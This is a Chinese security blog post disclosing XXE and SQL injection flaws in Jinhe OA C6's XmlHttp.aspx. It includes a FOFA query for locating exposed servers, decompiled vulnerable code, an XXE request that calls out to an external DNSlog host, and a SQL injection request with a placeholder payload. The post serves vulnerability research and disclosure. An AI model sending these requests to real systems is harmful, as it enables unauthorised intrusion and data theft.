---
title: "金和OA Jhsoft.Web.addmenu/LoginTemplate/XmlHttp.aspx XXE漏洞+SQL注入漏洞"
source: https://mrxn.net/jswz/jhsoft-LoginTemplate-XmlHttp-xxe-sqli.html
asset_dir: assets/金和oa-jhsoft.web.addmenulogintemplatexmlhttp.aspx-xxe漏洞+sql注入漏洞
---

# 金和OA Jhsoft.Web.addmenu/LoginTemplate/XmlHttp.aspx XXE漏洞+SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/9/10 08:23
- 634浏览
- [0评论](#comment)
- 23分钟阅读

深入探索

文本剥离工具

网络安全会议

SQL注入检测工具

---

# 漏洞简介

金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `XmlHttp.aspx`接口处存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞和[XXE](https://mrxn.net/tag/XXE)漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

漏洞扫描服务

# 影响版本

金和OA C6

# fofa语法

> app="金和网络-金和OA"

# 漏洞分析

直接根据 XmlHttp.aspx 在 bin 目录下查找 `Jhsoft.Web.AddMenu.dll` 将其进行反编译后找到 `XmlHttp` 的处理逻辑

```
namespace JHSoft.Web.AddMenu.LoginTemplate;

public class XmlHttp : Page
{
  protected void Page_Load(object sender, EventArgs e)
  {
    XmlDocument xml = new XmlDocument();
    xml.Load(this.Request.InputStream);
    XmlNode xmlNode = xml.SelectSingleNode("//root//flag");
    string innerText;
    if (xmlNode == null || (innerText = xmlNode.InnerText) == null)
      return;
    if (!string.op_Equality(innerText, "GetTemplateById"))
    {
      if (!string.op_Equality(innerText, "ActiveCustomCheck"))
        return;
      this.ActiveCustomCheck();
    }
    else
      this.GetTemplateById(xml);
  }
```

深入探索

漏洞预警服务

SQL注入防护

服务器安全服务

请求内容直接使 `xmlDocument.Load` 加载处理，造成[XXE](https://mrxn.net/tag/XXE)漏洞，

同时 XML 内容会被带入 `GetTemplateById` 方法中，跟进

SQL注入检测工具

```
protected void GetTemplateById(XmlDocument xml)
{
  string str1 = string.Empty;
  XmlNode xmlNode = xml.SelectSingleNode("//root//id");
  if (xmlNode != null)
  {
    string innerText = xmlNode.InnerText;
    DataTable templateById = JHSoft.AddMenu.LoginTemplate.LoginTemplate.GetTemplateById(innerText);
    ......
public static DataTable GetTemplateById(string id)
{
  string str = $"select * from LoginTemplate\r\n                where id={id}";
  DBOperator dbOperator = DBOperatorFactory.GetDBOperator();
  DataTable templateById = dbOperator.ExecSQLReDataTable(str);
  if (dbOperator.IsError)
    templateById = (DataTable) null;
  return templateById;
}
```

深入探索

安全研究工具

防火墙软件

安全研究报告

`id` 的值被直接拼接进SQL语句中执行，无任何过滤和校验，导致[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

# 漏洞复现

## XXE

```
POST /c6/Jhsoft.Web.addmenu/LoginTemplate/XmlHttp.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net
Content-Type: application/x-www-form-urlencoded

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://xxe.dnslog.pt/xxe_test">
%remote;]>
<root/>
```

在DNSLOG平台成功收到请求

代码安全审计

[![金和OA Jhsoft.Web.addmenu/LoginTemplate/XmlHttp.aspx XXE漏洞+SQL注入漏洞](images/img-001-bb0e64f86af2.webp)](https://image.mrxn.net/815c1adac48b4ce8b6931b3da0ad13cd.webp)

## SQL注入

```
POST /c6/Jhsoft.Web.addmenu/LoginTemplate/XmlHttp.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net
Content-Type: application/x-www-form-urlencoded

<?xml version="1.0" encoding="utf-8"?>
<root>
  <flag>GetTemplateById</flag>
  <id>SQLI_POC</id>
</root>
```

[![金和OA Jhsoft.Web.addmenu/LoginTemplate/XmlHttp.aspx XXE漏洞+SQL注入漏洞](images/img-002-707f50f6017d.webp)](https://image.mrxn.net/0c91dfd0e8da4ca390a997836c1b1f4f.webp)

成功延时 5 秒

漏洞扫描服务

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#0day](https://mrxn.net/tag/0day)
- [#XXE](https://mrxn.net/tag/XXE)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)
- [5.1.XXE](#toc-5-1-)
- [5.2.SQL注入](#toc-5-2-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
